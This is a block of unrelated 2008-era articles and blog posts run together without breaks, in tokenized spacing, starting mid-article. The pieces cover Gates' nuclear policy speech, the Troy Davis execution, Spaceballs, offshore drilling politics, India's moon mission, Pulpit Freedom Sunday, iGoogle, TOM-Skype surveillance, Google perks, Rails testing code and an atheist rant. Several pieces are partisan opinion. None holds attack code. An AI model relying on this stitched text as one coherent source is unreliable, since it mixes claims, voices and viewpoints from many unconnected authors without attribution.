Gates pointed out that , writing four years later to President Woodrow Wilson , who had been elected in 1916 on a platform of keeping the US out of the world war , " the same Andrew Carnegie encouraged the president in the strongest terms to declare war , because , he wrote , ‘ There is only one straight way of settlement . ' "
Turning to US nuclear policy , Gates said , " As long as others have nuclear weapons , we must maintain some level of these weapons ourselves : to deter potential adversaries , and to reassure over two dozen allies and partners who rely on our nuclear umbrella for their security — making it unnecessary for them to develop their own . "
This comment gives a sense of the highly tense and unstable character of international relations , and the paranoia of US officials .
Gates ' fears about the spread of nuclear weapons are not limited to existing programs of " potential adversaries , " among which Gates included " rogue states such as North Korea and Iran , or Russian or Chinese strategic modernization programs . "
His fears extend to the nuclear policy of all states , including current US allies .
Gates later repeated this point : " We simply cannot predict the future . [...] our adversaries and other nations will always seek whatever advantages they can find .
Knowing that , we have to be prepared for contingencies we have n't even considered . "
Gates ' list of US - friendly states that have chosen not to develop nuclear weapons was significant : South Korea , Taiwan , Brazil , Argentina , South Africa , and Libya .
Two of the most obvious such countries — ex - World War II enemies Japan and Germany — were not included .
Gates did not explain what political factors induced him to omit them .
Gates then issued a remarkable threat : " As long as other states have or seek nuclear weapons — and can potentially threaten us , our allies and friends — then we must have a deterrent capacity that makes it clear that challenging the US in the nuclear arena — or with other weapons of mass destruction — could result in an overwhelming , catastrophic response . "
According to Gates , the US must be able to credibly threaten a nuclear holocaust against any state that " challenges " the US in the nuclear arena or with other " weapons of mass destruction . "
By his own words , such a challenge does not require a nation to threaten to attack the US .
It does not even require that a nation possess nuclear weapons or other WMD .
It is enough for a nation merely to " seek " such weapons for it to become a potential target for a preemptive " overwhelming , catastrophic response " from the United States .
Such a doctrine has immense implications not only for US nuclear weapons programs , but for the totality of US foreign policy .
It stipulates that every foreign power in the world must believe that attempting to develop nuclear weapons invites US nuclear attack .
Thus , the US would arguably be obliged to attack with nuclear weapons countries which it accused of developing nuclear weapons — such as Iran and North Korea — lest the rest of the world conclude that the US will not carry out its threats .
Gates is filling out the Bush doctrine of pre-emptive war — announced in advance of the unprovoked invasion of Iraq based on lies about supposed Iraqi weapons of mass destruction — with the proviso that a US first - strike can involve the large - scale use of nuclear weapons .
In his speech , he called for a substantial increase in nuclear weapons spending , including the possible resumption of nuclear weapons testing .
" There is absolutely no way we can maintain a credible deterrent and reduce the number of weapons in our stockpile without either resorting to testing our stockpile or pursuing a modernization program , " he declared .
Citing a " bleak " prognosis for overcoming technical and staffing problems of US strategic nuclear weapons programs , Gates explained that his policies involved the largest and most powerful US weapons :
" The program we propose is not about new capabilities — suitcase bombs or bunker - busters or tactical nukes . [...]
It is about the future credibility of our strategic deterrent . "
Gates also addressed concerns about the command structure of the US Air Force 's nuclear forces , sparked by his June 5 sackings of several top Air Force officials after it was discovered that US nuclear missile parts had been shipped to Taiwan .
At the time , the World Socialist Web Site raised the question of whether the shipment to Taiwan had been part of an unofficial foreign policy carried out by rogue sections of the US military .
However , the bourgeois press accepted official explanations that this had been a simple technical oversight .
But Gates ' proposals centered not on fixing technical problems with Air Force shipping protocols , but rather on controlling Air Force policy .
He announced measures to centralize " nuclear policy and oversight , " including a new headquarters office at the Air Staff and a Nuclear Weapons Center at Kirtland Air Force Base , which is to be tasked with " clearing up ambiguous chains of command that have created problems in the past . "
Gates closed by listing several types of attack that the US might use " deterrence , " nuclear or otherwise , to prevent .
He spoke of developing " appropriate " responses to cyber-attacks on US computer systems , to deterring attacks on US communications satellites ( which could be carried out only by countries with technologically advanced militaries ) and of developing " new technologies to identify the forensic signature " of nuclear material , which would allow the US to " hold any state , terrorist group , or other non-state actor or individual fully accountable for supporting or enabling terrorist efforts to obtain or use weapons of mass destruction . "
It should be pointed out that several of these types of attack — especially cyber - attack and terrorist attacks with weapons of mass destruction — are by their nature difficult to track , and leave open the possibility of manipulation by Washington .
This is perhaps best shown by the 2001 anthrax attacks , which were carried out using spores from a US Army lab at Fort Detrick and ultimately blamed on a US civilian scientist working at Fort Detrick , but which the media long blamed on Muslim terrorists .
In assessing the significance of Gates ' remarkably bellicose comments , it should be noted that Gates ' justification of pre-emptive nuclear war is not isolated .
In April , then - Democratic presidential candidate Hillary Clinton said that if Iran attacked Israel , the US would respond by " obliterating " Iran .
These comments are further evidence that the US ruling class will pursue an even more aggressive foreign policy after the 2008 elections than before .
Questions Linger as Man's Execution Nears Execution is planned though several witnesses have recanted their testimony .
Sept. 23 , 2008  --
Georgia plans to execute a death row inmate today for the 1989 murder of a Savannah police officer , though several key witnesses have recanted their incriminating testimony .
Unless the U.S. Supreme Court steps in , Troy Anthony Davis , 39 , will die by lethal injection tonight .
The Supreme Court is scheduled to decide whether it will hear Davis ' appeal Monday , six days after his planned execution .
The court usually declines to hear such cases .
Davis ' case has attracted national attention because seven of the nine witnesses who testified against him in his 1991 murder trial have since recanted , several of them saying they felt pressured by police to lie on the stand and implicate Davis .
There was no physical evidence tying Davis to the murder of Officer Mark MacPhail and several new witnesses have come forward to implicate another man in the crime , Davis ' lawyers say .
Former President Carter , former Georgia Congressman Bob Barr and Pope Benedict XVI , among others , have called on the state parole board to reduce Davis ' sentence to life in prison .
The board earlier this month rejected Davis ' clemency petition after what it called an exhaustive review of the evidence in his case .
Stephen Bright , a professor at Yale Law School and director of the Southern Center for Human Rights , called the timing of Davis ' execution " unseemly . "
" All across the spectrum of people 's views on criminal justice , there 's near unanimity that this trial was not reliable , " he said .
" We can't say with certainty that this man is guilty of this crime .
In fact the probability is he is not guilty . "
A spokesman for the Georgia Attorney General 's Office declined to comment on pending litigation .
In court papers , the state has asked the Supreme Court not to stay the execution and has argued that the recantations are not enough to grant Davis a new trial .
Several courts have agreed , saying there was not enough evidence that Davis received a constitutionally unfair trial .
By a 4 - 3 decision , the state Supreme Court in March found that the new evidence probably would not have produced a different verdict at trial .
MacPhail , a father of two , was murdered Aug. 19 , 1989 , after responding to a fight outside a Burger King .
Davis testified that he was nearby but was not involved in MacPhail 's death .
The next day , a witness told police that Davis had killed MacPhail .
Davis had left town and surrendered to police a few days later , according to the Attorney General 's Office .
Witnesses at the trial said Davis pistol - whipped a homeless man then shot MacPhail when he intervened .
" My son did n't have a chance , " said MacPhail 's mother , Anneliese MacPhail , who added that she was " disgusted " by the attention being paid to Davis .
" I feel disgusted about the whole case , " she said .
" I lost my son , my grandchildren lost their father .
No one thinks about all the tragic things that we are going through and then they are making a circus about someone who is guilty as can be . "
Seven witnesses have since changed their testimony .
Darrell Collins , a friend of Davis ' , said in an affidavit that he initially denied that Davis was involved in the murder , but " after a couple hours of the detectives yelling at me and threatening me , I finally broke down and told them what they wanted to hear .
They would tell me things that they said had happened and I would repeat whatever they said . "
Another witness said she was on parole and feared she would be sent back to prison if she did not tell police that Davis killed MacPhail .
" We need to have a day in court where a judge hears the evidence and explanation showing why that person likely did testify falsely , " said Jason Ewart , Davis ' lawyer at Arnold and Porter in Washington , D.C .
Davis is now focused on his family and friends , said his sister Martina Correia who visited him Monday .
" He 's more concerned about us than he is for himself , " she said .
" He says God has given him peace .
If his life is given , it 's not given in vain because people will make a stand against what 's happening in Georgia . "
The Schwartz is finally with us .
After multiple delays , Spaceballs : The Animated Series , Mel Brooks ’ tooned sequel to his Star Wars spoof Spaceballs , is finally airing in the United States .
( Watch a teaser for the show , embedded . )
On Sunday , gamer channel G4 debuted the series featuring the adventures of a space crew of mogs , droids and humans .
Although most of the original characters , including Dark Helmet , Barf , Dot Matrix and Princess Vespa , are all returning , only a few of the original actors are voicing their roles .
Brooks lent his pipes to his two characters , the air - hungry dictator President Skroob and wise - cracking creature Yogurt .
Daphne Zuniga and Joan Rivers reprise their roles from the sci - fi comedy classic as Princess Vespa and Dot Matrix , respectively .
Animal hybrid Barf ( originally played by the late and great John Candy ) is now voiced by actor Tino Insana .
Rick Moranis and Bill Pullman declined to participate in the reboot .
It ’s hard to imagine the two - decade - old concept garnering the same kinds of laughs it did in 1987 , but for some , waxing nostalgic over time - worn favorites never gets old .
Not to mention reviving franchises is the next big theater trend .
Has anyone caught the cable version ?
Does the animated series live up to the cultastic fun of the original film ?

Republicans Threaten to Shut Down the Federal Government
Republicans are finally starting to stand up for themselves .
They have found an issue in offshore oil drilling that looks like it could be a winner for them and they are taking the offensive .
First the Republicans have refused to leave the house and have continued debating offshore drilling although the house is in recess , and now they are threatening to shut down the federal government if offshore drilling is not voted on .
Some Republicans say they are prepared to vote against a resolution to fund the federal government for the 2009 fiscal year unless Democrats agree to lift an offshore drilling moratorium .
Republicans have finally grown a set and are taking a stand on an issue .
After the 2006 political castrating of the Republican party the Republicans have been afraid of taking on the Democrats .
The “ re - branding ” of the Republican party was never more evident that the nomination of John McCain as the party ’s candidate for president .
Now however , Republicans have looked down and realized there still there , so why not use them ?
Republicans are starting to stand up for what they believe in , at least on this issue , and it is good to see .
I have grown tired of fighting for a party that wo n’t fight for itself , and now they may be ready to do so .
This issue is a winner for the Republicans as a majority of Americans support an increase in domestic drilling .
Democrats are in the back pocket of the environmental groups , which have put us in this situation on the first place , so there is no way that they can win this issue .
It is up to Republicans to get this done .
Republicans are n’t afraid of incurring the same type of backlash that they received after shutting down the government in 1995 :
with public opinion polls showing that most Americans support increased offshore drilling , Republicans are emboldened to challenge Democrats on the issue , and say that Democrats , not Republicans , would be blamed for the consequences of a government shutdown .
This is becoming a hot button issue , pressure is being applied by the American people to get something done .
We saw what we could do when we rose up in protest of the immigration reform bill and we can do it again .
We have to do it again , time is running out .
Democrats are on the wrong side of this issue and we must keep the pressure on them to expose them .
Republicans need to keep fighting and promoting this issue .
There can be no letup .
It ’s about time .
• Satellite hopes to map surface for rare helium 3 • Critics say cash is wasted while millions go hungry
It will be a small step for mankind , but a giant leap forward for India .
In a boost to national prestige , the country will launch its first unmanned moon mission tomorrow - blasting its Chandrayaan satellite into space from an island off the Bay of Bengal , using a domestically produced rocket system .
In doing so , it will match Japan , which in 1990 became the first Asian nation to send a satellite to orbit the moon , signalling the possibility of a race for mineral wealth on the lunar surface .
If all goes to plan , India 's tricolour flag should be drifting down towards the freezing , airless lunar surface as dawn breaks over the subcontinent on November 11 .
The 239,000 - mile journey is not straightforward - it took the Americans and Russians almost two decades to master it , from the moment space exploration was born .
Once above the Earth 's atmosphere the launch vehicle 's thrusters will have to manoeuvre and fire the Chandrayaan I rocket with precision .
If all goes to plan , the satellite , weighing half a tonne , will enter a lunar orbit some 62 miles above the moon 's surface on November 8 and begin its two - year mission to map the moon in 3D , survey its surface for mineral wealth and start its 11 hi-tech probes , including five from the US , Sweden , Japan , Germany and Bulgaria .
One of India 's aims in reaching the moon is the possibility of harvesting helium 3 , a key fuel for nuclear fusion .
Although fusion is not commercially viable today , scientists say it one day will be , and that once it is a fuel supply will become a problem , as the Earth is believed to have only 15 tonnes of helium 3 .
The moon is thought to contain up to 5 m tonnes .
Officials at the Indian Space Research Organisation ( Isro ) remain tight - lipped about the possibility of a lunar land grab .
UR Rao , a former director of Isro , was less circumspect , pointing out that the moon might have " enough [ helium 3 ] to produce energy for 8,000 years " .
This view echoes that of the head of China 's Chang 'e project , who told the China Daily in 2006 that " each year three space shuttle missions could bring enough [ helium 3 ] for all human beings across the world " .
Last month , a Chinese astronaut completed a 15 - minute space walk for the first time .
However , India has big ambitions .
There are proposals to put the first Indian into space by 2014 and to launch a manned lunar mission by 2020 - four years ahead of China 's target date .
The Indian agency 's next step is to launch a second unmanned lunar mission in 2011 , comprising an orbiting spacecraft , a lander and a moon - rover built with Russian help .
The Chandrayaan mission , at a time of economic belt - tightening , has sparked a national debate about whether a country with hundreds of millions of poor people can afford to play catch - up in the skies .
S Satish , director of public relations at Isro , said that the Indian cabinet had given the go - ahead for the second mission in 2011 , but other missions awaited approval .
" We have to consider the costs for a [ manned ] moon mission .
Even with our low costs it will be billions of dollars .
You need a good reason to send someone to the moon for that amount , " Satish said .
Earlier this year India was ranked by analysts at Futron , a hi-tech consultancy , as only a fraction behind China in global space competitiveness rankings , and well ahead of Japan , Israel and Canada .
It is also building a low - cost , hi-tech base .
China 's Chang'e I cost nearly double India 's Chandrayaan I bill of $ 86 m .
This thriftiness was born of necessity .
With an annual budget of about $ 1bn - less than a tenth of Nasa 's - Isro has to do a lot with little .
Until now India 's space agency has concentrated on putting satellites in orbit .
It has 11 communications satellites , using them to bring education and healthcare to remote villages via tele - links with schools and hospitals in cities .
" The whole thrust of [ India 's space programme ] has been to get real benefits , " said Gopal Raj , author of Reach For The Stars , a book about the country 's rocket programme .
Raj pointed out that the Madras Institute of Development Studies recently calculated that for every rupee spent on the space programme , two were generated in " indirect and direct returns " .
Critics say that the space mission is a cover for an exercise in " national military - industrial ego " .
Ominously , earlier this year India 's chief of army staff spoke openly of his fears about China 's military space programme , and stressed the need for India to accelerate its own .
" Let 's face it we have an arms race here , " said Praful Bidwai , a long - time critic of the space programme .
" Rockets that can be used to fire satellites can be used for nuclear warheads , too .
India could be spending the money on getting clean drinking water to the poor , get food in their belly .
Instead it chooses to blast its way into a space race . "

Defying a federal tax law they consider unjust , 33 ministers across the country will take to their pulpits this Sunday and publicly endorse a candidate for president .
They plan to then send copies of their sermons to the Internal Revenue Service , hoping to provoke a challenge to a law that bars religious organizations and other nonprofits that accept tax - deductible contributions from involvement in partisan political campaigns .
The protest , called Pulpit Freedom Sunday , was organized by the Alliance Defense Fund , a consortium of Christian lawyers that fights for conservative religious and social causes .
When the fund first announced the protest this year , it said it planned to have 50 ministers taking part .
As of Thursday it said it had hundreds of volunteers , but had selected only 33 who were fully aware of the risks and benefits .
The fund did not make the list of participants public , saying that it had received phone calls threatening to disrupt the sermons .
One participant reached by telephone said he could not talk about it .
Google has released its latest upgrade of iGoogle to all U.S. users called " full canvas views " .
What this means is that all those little widgets you see on your iGoogle can now be clicked on to expand across the entire page .
Not all widgets have this functionality yet , but most of them do .
Some of my favorites include The New York Times , The Wall Street Journal , Google Calendar , Go Comics , TV Guide and Sudoku .
But there 's also Flixster 's movie gadget that lets you watch trailers , read reviews and synopses and Gmail of course .
In addition to the widgets , the iGoogle tabs have been shuffled over to the left side of the page , which looks nice but seems to take up more space than necessary .
I have been using the new iGoogle for several weeks now as part of a test group and while there are some very frustrating downsides to the new iGoogle , the full canvas view does have its advantages .
It may take a while to get used to how you navigate through the widgets : clicking on the widget title will launch the website it is connected to , but clicking on content or on the box in the right hand corner expands the widget into full canvas view .
There are a few exceptions to this rule , but that is generally how you get around in the new iGoogle .
Most of these widgets work very well , Flixster is probably the most well developed that I 've used with its functional video plugins and location - based showtime listings .
The New York Times and the WSJ expand into a front - page style news digest ; however , to read news items you are redirected to the paper 's website .
While I like the functionality for a lot of the third - party widgets , I was surprised that Google 's own widgets do n't match up .
The Gmail widget , for example , does not provide a satisfactory experience .
Google admits that it 's official widget is not fully functional , and since testing of canvas view started there have been improvements .
You can read mail , compose , delete , archive and mark a message as read or unread , but amazingly all hyperlinks are dead within iGoogle .
This can be extremely annoying , especially if you get a newsletter or digest delivered to your inbox on a regular basis , and reading it requires you to get out of iGoogle .
Why Google would not add this standard and simple functionality to their Gmail widget is beyond me , but hopefully they will fix that in time .
Google Calendar also has its downside because you cannot add anything to it within iGoogle ; however you can view everything you have scheduled in Google Calendar .
That being said , I do like the advantages that full canvas view provides to bring more content into one place .
If you can get used to the navigation , the new iGoogle is a useful tool .
The full canvas view is only available for U.S. users at the moment , but Google says it will roll out the new features to international users soon .
You know that argument the John McCain - Sarah Palin campaign has been relentlessly making that Barack Obama " pals " around with terrorists such as ' 60s ex-radical William Ayers ?
And they say this reflects on his poor judgment becaus e of other associates such as Rev. Jeremiah Wright and newly - convicted Tony Rezko ?
And worried Obama PR folks jump right on the e-mail whenever Obama and Ayers and the word " friend " appear together anywhere , even though Chicago Mayor Richard Daley and Obama chief strategist David Axelrod have called them friends or friendly .
Anyway , a listing on Amazon.com , one of the largest and most successful online merchandisers in the world , seemed to come down even beyond the Republicans ' side -- for a while anyway .
With Halloween just days away , they 're making a bundle off a $ 49.95 Barack Obama mask .
Which was displayed on the " terrorist costume " page .
You read that right !
( UPDATE : Amazon 's listing seems to have caught itself and deleted the Obama mask from the terrorist page .
However , before that happened , The Ticket captured a photo .

If you 're an authoritarian government that closely monitors your citizens ' online communications , here 's a tip from Ars Technica : tell your minions not to store the logs on publicly - accessible servers .
This is exactly what China has done with information pulled from the TOM - Skype network , leading a handful of researchers to discover that China is logging text messages and analyze the country 's behavior with regards to the online monitoring and censorship of citizens .
In a joint report between ONI Asia and the Information Welfare Monitor , author Nart Villeneuve details evidence that China not only monitors and logs text chat , but also targets specific users for further monitoring .
The report published yesterday , titled " BREACHING TRUST :
An analysis of surveillance and security practices on China 's TOM - Skype platform " ( PDF ) , explains that full chat text messages from TOM - Skype users were found on insecure , publicly - accessible web servers along with the encryption key required to decrypt the data ( TOM Online is Skype 's operating partner in China ) .
This — along with " millions of records containing personal information " such as IP address , usernames , and landline phone numbers — were stored along with additional data detailing Skype users outside of China who have communicated with TOM - Skype users in China .
" The captured messages contain specific keywords relating to sensitive political topics such as Taiwan independence , the Falun Gong , and political opposition to the Communist Party of China , " reads the report .
Villeneuve explains that the surveillance does n't stop there , either .
According to the groups ' analysis , many of the captured messages contain content that falls outside of typically - censored words or topics , " suggesting that there may be criteria , such as specific usernames , that determine whether messages are captured by the system . "
Translation :
If you 're the type who regularly talks about unapproved topics on Skype , you may be flagged for further monitoring of everything you say .
Clearly , there are a number of problems with this discovery , starting with security .
Villeneuve notes that the information contained on the servers could be used to exploit the TOM - Skype server network , and an attacker can access detailed user profiles .
" In fact , evidence suggests that the servers used to store captured data have been compromised in the past and used to host pirated movies and torrents ( for peer - to - peer file sharing ) , " reads the report .
Clearly , crafty hackers already know where these servers are and how to get into them .
Additionally , the findings raise the question as to what extent TOM and Skype are cooperating with the Chinese government .
The report questions the legal basis for TOM - Skype to capture and log this information , who has access to it , and what will be done with it in the future .
Villeneuve notes that Skype is neither transparent nor forthcoming about the exact nature of its compliance with Chinese authorities , a disturbing trend among US - based Internet companies conducting business in China .
When asked for comment about the findings , eBay ( Skype 's parent company ) spokesperson Jennifer Caukin only responded to the security implications .
" The security breach does not affect Skype 's core technology or functionality , " she told the New York Times .
" It exists within an administrative layer on Tom Online servers .
We have expressed our concern to Tom Online about the security issue and they have informed us that a fix to the problem will be completed within 24 hours . "

I ’ve had the fortune to work at some great companies , which offered perks that were almost as good as the salaries they gave out .
What ’s it like at these places ?
For successful , top - notch companies , rewards abound ( to keep employees loyal ) ; and here are some of the extras that can round out one ’s compensation package :
Free gym and pool
Stock options ( a piece of the equity pie )
Bonus plans
Referral bonuses
401 K with matching
Educational plan
Child care services on work campus
ESPP
Health Reimbursement Plans
Flexible Spending Plans
Matching donations to charities and schools
Relocation assistance
Life and disability insurance
These benefits are awesome and can make many hours of toiling away in a cubicle much more palatable .
But great as these benefits are , they ’re just the tip of the iceberg for a company that has regularly captured the # 1 title as “ Best Company ” in the nation .
In Silicon Valley , this is where everyone ( from accountants to engineers to web designers ) wishes they could work , so I was curious to find out what it really was like to work at a place where nerds rule 😉 .
Profile of A Top Company
Fortune ’s number one company to work for “ sets the standard for Silicon Valley : free meals , swimming spa , and free doctors onsite .
Engineers can spend 20 % of time on independent projects .
Their company is so stinking rich that it continues to ooze cash even while lavishing benefits on its staff .
” They ’re also responsible for a good portion of California ’s tax dollars .
These are the reasons why Google takes the title as the best place to work :
What ’s it like ?
Life for Google employees at the Mountain View campus is like college .
It feels like the brainiest university imaginable – one in which every kid can afford a sports car ( though geeky hybrids are cooler here than hot rods ) .
Fun , healthful activites
At Google you can work out in the gym ; attend subsidized exercise classes ; get a massage ( by a masseuse or fancy massage chairs ) ; study Mandarin , Japanese , Spanish and French and ask a personal concierge to arrange dinner reservations .
Too many amenities to count , including lap pool , rock climbing wall , pool table .
Or how about beach volleyball , Foosball , videogames , ping pong and roller hockey twice a week in the parking lot .
Oh yeah , dogs allowed .
So you ’re no longer just a wealthy geek , you ’re also a wealthy buffed geek !
~ooOoo~
Fantastic food
Google runs 11 free gourmet cafeterias and offers all its employees free gourmet meals .
Company lore has it that Brin and co-founder Larry Page believe no worker should be more than 150 feet from a food source .
~ooOoo~
Transportation benefits
How about free Wi - fi shuttle coaches to ferry you from train stations to your work campus ?
Onsite car washes and oil changes are among the numerous perks Google offers to all its workers .
Want to buy a hybrid car ?
The company will give you $ 5,000 toward that environmentally friendly end .
Oh yeah , get free scooters to travel around campus .
~ooOoo~
Multi -task with lots of help , on site
You can get your errands done at work .
Get a haircut while doing your laundry .
Exercise at a workout room with weights and rowing machine , keep stuff at locker rooms , have your kid in child care , get your paperwork done with onsite notaries , your car serviced on site and get checkups with five onsite doctors available , free of charge .
~ooOoo~
More money , more rewards for top employees
Refer a friend and you ’ll get a $ 2,000 reward .
New parents get $ 500 in takeout food to ease their first four weeks at home .
And what about the 27 - year - old engineer who received a million - dollar founders ’ award ( Google bonus ) for her work on a program that searches computer desktops .
Then there are those who are coasting , waiting for their stock options to kick in , said to be “ resting and vesting . ”
And despite this all , Google needs to worry about retention !
They ’re considering starting a sabbatical program and get this — thinking of new career opportunities for the restless ( you mean invent new jobs ? ) .
It has also institutionalized , among other things , a bevy of compensation incentives , founders ’ awards than can run into millions of dollars , and special bonuses .
Get your ideas heard and executed
The Google shuttle bus exists today because an employee got sick of driving to work and scouted out a bus company , then plotted out the routes a shuttle might take .
She brought the idea to senior management only after she ’d done all the research .
Any other company would ’ve formed a cross-divisional transportation feasibility committee to study the issue .
Google just did it .
~ooOoo~
Now what could possibly beat working for a rich company in Silicon Valley ?
Well how about working for a rich company anywhere in the world — including in your OWN native country ?
From the following examples , you can see that you no longer have to go outside of your country to work at Google .
If you have the skills such a hot shot employer is looking for , you could be eligible for a golden ticket .
And this is why capitalism rules , it affords the ability for massive wealth generation that can be spread to far flung places .
Case in point : these Google employees in India share the culture of the mother company .
Top Company In Bangalore , India
Google ’s corporate strategy in India has been described as a “ brain drain in reverse . ”
A turbaned Sikh relaxes in a massage chair , eyes closed .
Interspersed among the cubicles are a foosball table , billiards , darts , a chessboard , and a board game called carrom .
A tent - shrouded chair sports a sign , FORTUNES TOLD HERE .
A great side benefit to being part of an elite work force ?
Landing a job at Google is said to increase marriage prospects in a culture where title and income are critical to the practice of arranged matchmaking .
I also really like this logo 🙂 .
Random Philosophical Ramblings On Wealth and Success
Just like a company that has such far reaching tentacles , I think of individuals as influencing their own space , with certain people more able to reach out than others ( also in various ways beyond the financial ) .
Companies like Google enable its employees to be in such a fortuitous and influential position .
How loud does money talk ?
Well let ’s look where money and success can take you : if you ’ve done well financially , just think of all the influence and power you ’ve got in your hands .
Though the great majority of us wo n’t be facing something like the “ Google effect ” , even some money can exert influence , albeit at a smaller scale .
For those of us luckier than others , I wish that good fortune and prosperity will offer a positive effect that extends beyond our own lives .

I have received a number of emails to the effect of : I 'm a conservative , and I can't tell you how fired up and excited I am by Sarah Palin 's speech .
Finally we have a fresh , new face who will tell it like it is .
Noted .
As I wrote just after Palin finished speaking , in the jet - lag blur accompanying the latest 14 - hour flight back to Beijing , the speech was effective , funny , and strong in summing up the views of " the base . "
It would be as if Barack Obama had chosen Al Franken as his running mate -- and Franken had let rip at the convention with the anti-Bush , anti-Republican one - liners he refined in his Air America / " Big Fat Idiot " days .
But , as suggested earlier , there are two problems with this approach , which seem more evident as clips are played and replayed .
First , if this speech energized the Republican base , I bet it did the same -- in opposition -- for the Democratic base .
And the Democratic / independent / " had enough ! " base is simply larger this year .
Second , I wonder how Palin 's mocking , contemptuous tone about Obama will travel and age .
It was great inside the hall -- again , think of Al Franken , who would of course have been funnier .
But the track record of cocky - sounding newcomer politicians is not so great .
Recently the folk over at Hashrocket had another one of their famed 3 - 2 - 1 Launches - this time inviting as guest stars Tammer Saleh and Joe Ferris of another renowned Rails shop Thoughtbot .
The application they worked on is called spot.us and is a community funded reporting tool .
The interesting thing about this project was that the source is freely available on Github for any Joe Bloggs to pour over ( link ) .
Not only that , but the client taped his reaction upon seeing the application for the first time : ( link ) .
I had a quick looksee at the application , and what I saw blew me away - how'd they get so much done in such a short space of time ?
Here 's some of the stuff I noticed :
Used a good amount of boilerplate
Let 's face it , a good chunk of every application is the same as the last application .
Hashrocket have got a pretty decent suite of boilerplate code that they bung into the app to get started .
Upfront design
The week before the sprint , a bunch of stuff was checked in to do with user interface .
this included :
Mocked up views ,
All the images necessary for the design ,
Javascript plugins
Basically , a good solid structure was in place so that the developers could go hard on concentrating on what they need to do , and not worry about big design decisions .
Not only that , but before any work had done , the application '' looked ' ' just like the final product , even if it did n't necessarily work yet .
Uber frequent commits
Take a look at the github network tree on the 24th , 25th and 26th - every 6 or so minutes something gets checked in .
These folks checked in so fast it was as if their lives depended on it .
This is because they had small , perfectly formed units of work .
Get the issue , work on it , check it in -> rinse and repeat .
Also because of the hard - core frequent commits there were only 2 source code conflicts for the entire stretch !
Haml
I 've studiously avoided haml throughout my Rails career because a niggling sensation at the back of my head does n't feel comfortable with adding another layer of abstraction between me and the html .
I 've been bitten before with all the asp.net stuff Microsoft uses to hide html from .NET developers - and have since loved looking at plain old html since .
In spot -us all of the views are done in HAML .
After reading it for a bit , and getting my head around all that white space , I realised that the intent of the code was really easy to comprehend - I did n't have to wade through all that excess html junk we put up with .
Instead the templates read like a page of code , filled with lovely methods and variables .
Used JQuery AND NOT Prototype
So , there 's a weird little nasty part of me that believes you have to take sides in the great Javascript Framework War .
Historically Rails developers belong to the Prototype / Scriptaculous faction - but all the hip cool kids these days seem to be gravitating towards JQuery .
Hashrocket instead decided to go with the best bits of both worlds by implementing bits of each .
In their code you can see the old glory ( some would say divisive ) use of remote_form_for ( which generates prototype Javascript ) combined with the new hotness of JQuery plugins .
UPDATE
Thanks to Ben Scofield for pointing out in the comments that the Hashrocket team actually use the jRails plugin .
This plugin ensures that all the Rails javascript helper methods spit out JQuery rather than Prototype / Scriptaculous code .
Find out more here .
JQuery has a nice little method :
jQuery.noConflict ( ) ;
This helps to make sure that jQuery does n't conflict with other libraries - pretty sweet .
Done away with fixtures and used factory_girl
The Geniuses ( Geni -i ? ) at Thoughtbot forego the whole fixtures route in favour of creating custom factories for their tests .
The sweet little plugin that enables all this magic is called Factory Girl .
Here 's an example - instead of calling out to a donation fixture , they just create a factory of a couple and populate it with the relevant attrbutes .
it " is n't valid if there is already a donation for that tip and user " do donation = Factory ( : donation ) duplicate = Factory.build ( : donation , : pitch => donation.pitch , :user => donation.user ) duplicate.should_not be_valid duplicate .should have ( 1) .error_on ( : pitch_id )
end
I 'm not sure if Hashrocket started using factory_girl in this project because of their special guest stars , but it 's not part of the standard boilerplate code .
Rspec view tests
Something hot and juicy about the hashrocket test suite was the inclusion of View Specs .
RSpec view tests allow you to set expectations of your views in a nice sweet fashion without having to worry about the whole http round trip business .
For example :
describe ' profiles / show ' do include ActionView :: Helpers : : AssetTagHelper before do assigns [ : profile ] = Factory ( : user ) end it " should display a thumbnail when available " do url = ' /url/to/ file.jpg ' attachment = mock ( ' attachment ' , :url => url ) assigns [ : profile ].stub !(: photo).and_return( attachment ) do_render response.should have_tag ( 'img[src = ? ] ' , url ) end end
Look ma , no controller !
Launch party
After a 3 - 2 - 1
Launch the hashrocket guys ' n ' gals have an awesome big party .
Judging from the tweets , it sounded like a fun time was had by all .
It got me thinking , most projects I 've worked on do n't specifically have an end point - they just kinda keep on going until they peter out and another project shows up .
Having a definite line in the sand is a great motivating factor .
And finally
There 's still a bunch of fiddly stuff to do on spot - us - but it 's pretty amazing what they came up with .
Rats off to ya !
Submitted by kellym78 on January 13 , 2008 - 2:45 am .
Wow .
A whole barrage of nonsense came at us in the past two weeks or so .
First off ... a man cuts off his own hand after seeing the Mark of the Beast on it .
With a circular saw .
And then microwaves it .
And then calls the authorities .
A quote from one of the sherriff 's deputies states , " That kind of mental illness is just sad . "
I could n't agree more .
Now , I know what you guys are going to say - - " It 's not BECAUSE of religion . "
Actually , I do n't think that a case could be made either way .
Was he likely vulnerable to delusional behavior ?
Yeah , I 'll concede that one .
The fact that religion is unique in its ability to seep into the crevices of your mind so pervasively that this theme plays out in our society over and over again is n't addressed by that statement , though .
How do the appeasers and framers answer that ?
Maybe it only manifests itself in those already prone to mental illness , but is n't that akin to excusing and perpetuating a belief system that preys on the weak ?
What exactly is it that causes atheists to feel this compulsion to cover for a malevolent , archaic belief that has caused mothers to kill their children , countless cases of child abuse , seemingly endless wars and violence , and self - mutilation and flagellation that can be traced back to the very foundation of the religion ?
One does n't need to delve too deeply to uncover the singular thread that has persisted throughout religious history -- violence .
Violence against others and oneself .
Internally or externally expressed ; it 's there from day one .
Ignatius of Loyola makes an interesting case study demonstrating the way in which religion exploits this predisposition to self - loathing and delusional disorders .
The esteemed founder of the Jesuit 's autobiography details graphically the man 's obsession with self - harm , his hallucinations , and his severe depression which would at times lead him to drastic measures such as digging a hole in his room at college deep enough that he hoped to end his life by jumping into it .
All that to escape the demons that he felt were tempting him with indecent , ungodly thoughts .
Sometimes that would lead to an insatiable desire to harm himself in order to purge this evil from his body , simultaneously punishing himself for not having the strength to resist thoughts that were likely normal human doubts and concerns .
His life as a beggar on the streets , living only off of the good - will ( and pity ) of others , as well as an extremely hazardous trek from his home in Italy to Jerusalem soon after his conversion on which he embarked with nothing more than the clothes on his back all coalesce to form an image of a man haunted by the great spectre in the sky and his impending wrath .
Augustine also suffered from some degree of guilt after his drastic conversion ; either from his previously debacherous lifestyle , the fact that his father was never " saved " , or the fact that he stole fruit from a tree as a young teen , the almighty , supposedly omnibenevolent , god has stricken people with fear , guilt , shame , and remorse severe enough to permanently alter their lives -- and often those of the innocent people around them .
------------------------------------------------------------------------------------------------
Next up in " Nutter News from the RRS " , we have the pope ( yeah - Ratzi again ) urging people to pray for clergy members who sexually abuse children .
